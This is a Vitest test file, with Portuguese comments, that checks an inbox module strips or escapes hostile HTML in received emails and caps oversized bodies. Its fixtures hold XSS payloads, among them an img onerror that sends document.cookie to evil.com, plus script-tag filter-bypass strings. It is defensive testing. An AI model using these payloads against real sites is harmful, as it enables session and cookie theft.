import { describe, it, expect, beforeEach, vi } from "vitest";
import { Readable } from "node:stream";

/**
 * O CORPO DE UM EMAIL RECEBIDO É INPUT NÃO CONFIÁVEL.
 *
 * Qualquer pessoa no mundo consegue escrever para a caixa do estúdio, por isso
 * tudo o que `getInboxMessage` devolve tem de ser tratado como hostil. Estes
 * testes exercitam o caminho real — `imapflow` (falso, sem rede) → `mailparser`
 * (verdadeiro) → o objeto que a API serializa para o back office — com cargas
 * construídas de propósito.
 */

// Mensagem crua que o servidor IMAP falso devolve. Cada teste define a sua.
const state: { raw: Buffer } = { raw: Buffer.alloc(0) };

function rawMessage(headers: string[], body: string): Buffer {
  return Buffer.from(headers.join("\r\n") + "\r\n\r\n" + body, "utf8");
}

vi.mock("imapflow", () => {
  // Só implementa o que `getInboxMessage` usa. Nunca abre uma ligação.
  class FakeImapFlow {
    async connect() {}
    async getMailboxLock() {
      return { release() {} };
    }
    async fetchOne() {
      return {
        uid: 42,
        envelope: {
          from: [{ name: "Atacante", address: "attacker@evil.com" }],
          subject: "Pedido de orçamento",
          date: new Date("2026-01-02T03:04:05Z"),
          messageId: "<atk-1@evil.com>",
        },
        flags: new Set<string>(),
        bodyStructure: { type: "text/html", part: "1" },
        headers: Buffer.from(""),
      };
    }
    async download() {
      return { content: Readable.from([state.raw]) };
    }
    async logout() {}
  }
  return { ImapFlow: FakeImapFlow };
});

beforeEach(() => {
  process.env.IMAP_HOST = "imap.example.test";
  process.env.IMAP_USER = "u";
  process.env.IMAP_PASS = "p";
});

const HTML_HEADERS = [
  "From: Atacante <attacker@evil.com>",
  "To: liquen.alentejo@gmail.com",
  "Subject: Pedido de orçamento",
  "Message-ID: <atk-1@evil.com>",
  "MIME-Version: 1.0",
  "Content-Type: text/html; charset=utf-8",
];

describe("getInboxMessage — corpo hostil", () => {
  it("nunca devolve HTML executável ao cliente (só texto inerte)", async () => {
    const { getInboxMessage } = await import("./inbox");
    state.raw = rawMessage(
      HTML_HEADERS,
      `<html><body><p>Olá</p>` +
        `<script>alert(document.cookie)</script>` +
        `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">` +
        `<svg/onload=alert(1)>` +
        `<a href="javascript:alert(2)">clique</a>` +
        `</body></html>`,
    );

    const msg = await getInboxMessage(42);
    expect(msg).not.toBeNull();

    // O contrato de segurança: o objeto entregue ao back office NÃO tem campo
    // `html`. Só `text`, que o React escapa ao renderizar como nó de texto.
    expect(msg).not.toHaveProperty("html");
    expect(Object.keys(msg!)).not.toContain("html");

    // E o texto entregue não traz nenhuma etiqueta viva.
    expect(msg!.text).not.toMatch(/<script/i);
    expect(msg!.text).not.toMatch(/onerror=/i);
    expect(msg!.text).not.toMatch(/<svg/i);
    expect(msg!.text).not.toMatch(/<img/i);
  });

  it("uma mensagem com HTML enorme continua legível (não rebenta a leitura)", async () => {
    const { getInboxMessage } = await import("./inbox");
    // Acima do tecto de análise do mailparser (2 MB). Qualquer remetente
    // consegue enviar isto — e newsletters legítimas passam-no à vontade.
    state.raw = rawMessage(HTML_HEADERS, "<p>" + "A".repeat(3_000_000) + "</p>");

    const msg = await getInboxMessage(42);

    // Tem de continuar a devolver a mensagem (metadados + algum corpo), nunca
    // rebentar — senão o estúdio fica sem conseguir abrir aquele email.
    expect(msg).not.toBeNull();
    expect(msg!.from).toBe("Atacante");
    expect(msg!.subject).toBe("Pedido de orçamento");
  });

  it("limita o tamanho do corpo devolvido (texto simples gigante)", async () => {
    const { getInboxMessage } = await import("./inbox");
    state.raw = rawMessage(
      [
        "From: Atacante <attacker@evil.com>",
        "To: liquen.alentejo@gmail.com",
        "Subject: Pedido de orçamento",
        "Message-ID: <atk-1@evil.com>",
        "Content-Type: text/plain; charset=utf-8",
      ],
      "B".repeat(5_000_000),
    );

    const msg = await getInboxMessage(42);
    expect(msg).not.toBeNull();
    // Sem tecto, 5 MB de texto viajavam em JSON até ao browser e bloqueavam o
    // separador. O corpo tem de vir cortado, e o corte tem de ser visível.
    expect(msg!.text.length).toBeLessThan(201_000);
    expect(msg!.text).toContain("Mensagem demasiado longa");
  });
});

describe("clampBody", () => {
  it("deixa passar intacto um corpo de tamanho normal", async () => {
    const { clampBody } = await import("./inbox");
    const body = "Olá, gostava de um orçamento para 120 convidados.";
    expect(clampBody(body)).toBe(body);
  });

  it("corta um corpo enorme e assinala o corte", async () => {
    const { clampBody } = await import("./inbox");
    const out = clampBody("x".repeat(1_000_000));
    expect(out.length).toBeLessThan(201_000);
    expect(out).toContain("Mensagem demasiado longa");
  });
});

/**
 * O `stripHtml` visto como o CodeQL o vê.
 *
 * Não é a barreira de segurança — o React é — mas as duas fraquezas que o
 * CodeQL apontou eram reais: a etiqueta de fecho tolerante e a necessidade de
 * iterar. Fixadas aqui para não voltarem.
 */
describe("stripHtml — as duas fraquezas que o CodeQL apontou", () => {
  // Só se testa através da API pública; o corpo HTML entra pelo caminho do
  // segundo parser (o que não converte HTML→texto).
  const limpar = async (html: string) => {
    const { __stripHtmlParaTestes } = (await import("./inbox")) as unknown as {
      __stripHtmlParaTestes?: (s: string) => string;
    };
    return __stripHtmlParaTestes?.(html) ?? "";
  };

  it("apanha um fecho com espaço: `</script >`", async () => {
    const saida = await limpar('<script >alert("xss")</script >texto visível');
    expect(saida).not.toContain("alert");
    expect(saida).toContain("texto visível");
  });

  it("apanha um fecho com atributos: `</script foo>`", async () => {
    const saida = await limpar("<script>maligno()</script foo>fim");
    expect(saida).not.toContain("maligno");
  });

  it("uma passagem só não chega: `<scr<script>ipt>` volta a formar a etiqueta", async () => {
    const saida = await limpar("<scr<script>ipt>corpo</scr</script>ipt>resto");
    expect(saida).not.toMatch(/<script/i);
  });

  it("uma etiqueta por fechar no fim não sobrevive", async () => {
    const saida = await limpar("visível <script");
    expect(saida).not.toContain("<script");
    expect(saida).toContain("visível");
  });
});
